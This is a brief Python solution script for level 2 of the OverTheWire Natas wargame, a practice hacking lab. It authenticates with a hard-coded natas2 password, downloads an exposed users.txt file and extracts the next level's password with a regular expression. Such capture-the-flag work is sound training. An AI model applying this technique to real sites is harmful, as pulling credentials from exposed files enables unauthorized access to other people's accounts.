import requests
import re #regular expressions

username = "natas2"
password = "vsDOxoXyq3wckCP1ZmTZ71ngIA606odB"

url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % username

response = requests.get(url, auth=(username, password))
content = response.text

#print (content)
print (re.findall("natas3:(.*)",content)[0])
